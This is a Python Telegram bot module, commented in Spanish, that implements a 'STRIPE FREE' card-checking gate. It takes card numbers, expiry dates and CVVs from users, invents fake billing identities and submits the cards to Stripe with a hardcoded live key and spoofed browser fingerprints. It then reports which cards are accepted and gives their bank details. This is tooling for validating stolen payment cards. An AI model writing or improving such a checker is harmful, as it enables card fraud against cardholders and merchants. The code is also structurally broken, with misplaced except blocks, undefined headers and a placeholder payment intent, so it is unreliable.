import time
import random
import string
import requests
import re
from pyrogram import Client, filters
from values import *  # Asumo que aquí tienes verified_gps(), waste_cards, banned_bins, antidb, maindb, etc.

headers = {
    "authority": "my.smashgo.co",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "PHPSESSID=0417s6hhofc6cgd4g5tbi72bge",
    "origin": "https://my.smashgo.co",
    "referer": "https://my.smashgo.co/account/membership-checkout/?level=8",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (Khtml, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
}

@Client.on_message(filters.command(["ca"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def ca(client, message):
    try:
        started_time = time.time()

        # Extraer datos del usuario
        user_id = message.from_user.id
        nombre = message.from_user.first_name

        # Buscar usuario en base de datos
        find = maindb.find_one({"_id": user_id})
        if not find:
            await message.reply_text(use_not_registered, reply_to_message_id=message.id)
            return

        rol = find["status"]

        # Validar status para uso en privado
        if rol == "F" and message.chat.type == 'private':
            await message.reply_text(buy_premium, reply_to_message_id=message.id)
            return

        # AntiSpam
        last_time_bytes = antidb.get(user_id)
        if last_time_bytes:
            antispam_time = int(last_time_bytes.decode("utf-8"))
            spam_time = int(time.time()) - antispam_time
        else:
            spam_time = 999

        if rol == "P" and spam_time < 10:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo después de {10 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return
        elif rol == "F" and spam_time < 60:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo después de {60 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return

        # Guardar tiempo de antispam
        antidb.set(user_id, str(int(time.time())))

        # Mensaje inicial de proceso
        text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> PROCESS: <b>□□□□□□□□□□ 0%</b>
<b>【〄】</b> CHECKING BY: <b><a href="tg://user?id={user_id}">{nombre}</a> - {rol}</b>
<b>【〄】</b> TIME TAKING: {round(time.time() - started_time, 2)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        msg = await message.reply_text(text=text, reply_to_message_id=message.id)
        await client.send_chat_action(message.chat.id, "typing")

        # Continúa aquí con la lógica del gate...
        
    except Exception as e:
        await message.reply_text(f"Ocurrió un error: <code>{e}</code>", reply_to_message_id=message.id)


        # Extraer tarjeta del mensaje o reply
        text_to_check = message.reply_to_message.text if message.reply_to_message else message.text
        input_nums = re.findall(r"\d+", text_to_check)

        if not input_nums:
            await msg.edit_text("No se encontraron números en el mensaje. Formato inválido.")
            return

        # Extraer partes de la tarjeta
        try:
            if len(input_nums) == 3:
                cc, mes_ano, cvv = input_nums
                mes = mes_ano[:2]
                ano = mes_ano[2:]
            elif len(input_nums) >= 4:
                cc, mes, ano, cvv = input_nums[:4]
            else:
                await msg.edit_text("Tu tarjeta está incompleta o en formato inválido.")
                return

            # Corregir si mes tiene más de 2 dígitos (intercambiar)
            if len(mes) > 2:
                ano, cvv, mes = cvv, mes, ano
        except Exception:
            await msg.edit_text("Error al procesar la tarjeta. Verifica el formato.")
            return

        # Validaciones básicas de la tarjeta
        if int(cc[0]) in waste_cards:
            await msg.edit_text("Tu tarjeta es inválida.")
            return
        if len(cc) not in [15, 16]:
            await msg.edit_text("Tu tarjeta es demasiado corta o larga.")
            return
        if (len(mes) not in [2, 4]) or (len(mes) == 2 and (mes < '01' or mes > '12')):
            await msg.edit_text("El mes de la tarjeta es incorrecto.")
            return
        if (len(ano) not in [2, 4]) or (len(ano) == 2 and (ano < '21' or ano > '29')) or (len(ano) == 4 and (ano < '2021' or ano > '2029')):
            await msg.edit_text("El año de la tarjeta es incorrecto.")
            return
        if (int(cc[0]) == 3 and len(cvv) != 4) or (len(cvv) not in [3, 4]):
            await msg.edit_text("El CVV de la tarjeta es incorrecto.")
            return

        lista = f"{cc}|{mes}|{ano}|{cvv}"
        bin_code = cc[:6]

        # Consultar BIN
        res = requests.get(f"https://lookup.binlist.net/{bin_code}")
        if res.status_code != 200:
            await msg.edit_text("No se pudo validar la tarjeta (error al consultar BIN).")
            return

        bin_data = res.json()
        if not bin_data.get('result', False):
            await msg.edit_text("Tarjeta inválida (BIN no válido).")
            return
        if f"{bin_code}\n" in banned_bins:
            await msg.edit_text("El BIN de esta tarjeta está baneado.")
            return

        vendor = bin_data["data"]["vendor"].lower()
        curl = requests.Session()

        # Generar datos aleatorios de usuario
        rand_user = requests.get("https://randomuser.me/api/?nat=us&inc=name,location").json()
        first_name = rand_user['results'][0]['name']['first']
        last_name = rand_user['results'][0]['name']['last']
        email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@gmail.com'
        password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

        # Datos para crear método de pago Stripe
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': 'f3abdff2-fbf9-422b-aed9-a41300a894819d9caf',
            'muid': 'f2bc9140-eacc-48e2-812d-1f411d4fb4246b3558',
            'sid': '7ce1609d-f9bb-4179-8709-2b2ee683e501ef95db',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/7338eae82; stripe-js-v3/7338eae82',
            'time_on_page': '40188',
            'key': 'pk_live_51HGdXUCXgKhUdQ35qYXUKcjbluFQq0AIPhLy3P83tUjGeQ1zbC2wMKiPLVVfuJOvEc2r2hQl4CqDucjHhaQS6a0x00rP7pEwU0',
        }

        res = curl.post("https://api.stripe.com/v1/payment_methods", headers=sk_headers, data=data)
        json_first = res.json()

        if 'error' in json_first:
            text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> INPUT: <code>{lista}</code>
<b>【〄】</b> RESULT: <b>RECHAZADO❌ [TARJETA INCORRECTA]</b>
<b>【〄】</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['country']} - {bin_data['data']['type']} - {bin_data['data']['level']}</b>
"""
            await msg.edit_text(text)
            return

        pm_id = json_first.get('id')
        if not pm_id:
            await msg.edit_text("Error al obtener ID del método de pago.")
            return

        # Confirmar pago con el método creado
        pay_data = {
            'payment_method': pm_id,
            'billing_details[email]': email,
            'billing_details[name]': f"{first_name} {last_name}",
            'billing_details[address][line1]': '123 Test St',
            'billing_details[address][city]': 'New York',
            'billing_details[address][state]': 'NY',
            'billing_details[address][postal_code]': '10001',
            'billing_details[address][country]': 'US',
            'payment_method_options[card][request_three_d_secure]': 'any',
            'key': 'pk_live_51HGdXUCXgKhUdQ35qYXUKcjbluFQq0AIPhLy3P83tUjGeQ1zbC2wMKiPLVVfuJOvEc2r2hQl4CqDucjHhaQS6a0x00rP7pEwU0',
        }

        res = curl.post("https://api.stripe.com/v1/payment_intents/pi_123456/confirm", headers=sk_headers, data=pay_data)
        json_confirm = res.json()

        # Analizar resultado y enviar mensaje final
        if 'status' in json_confirm:
            status = json_confirm['status']
            if status == 'succeeded':
                result_msg = "✅ ACEPTADA"
            elif status == 'requires_action':
                result_msg = "⏳ 3D SECURE REQUERIDO"
            elif status == 'requires_payment_method':
                result_msg = "❌ RECHAZADA - Método de pago requerido"
            else:
                result_msg = f"❌ RECHAZADA - Estado: {status}"
        else:
            result_msg = "❌ ERROR DESCONOCIDO"

        final_text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> INPUT: <code>{lista}</code>
<b>【〄】</b> RESULT: <b>{result_msg}</b>
<b>【〄】</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['country']} - {bin_data['data']['type']} - {bin_data['data']['level']}</b>
"""
        await msg.edit_text(final_text)

        # Actualizar tiempo antispam
        antidb.set(message.from_user.id, str(int(time.time())).encode("utf-8"))

    except Exception as e:
        await message.reply_text(f"Error interno: {e}", quote=True)
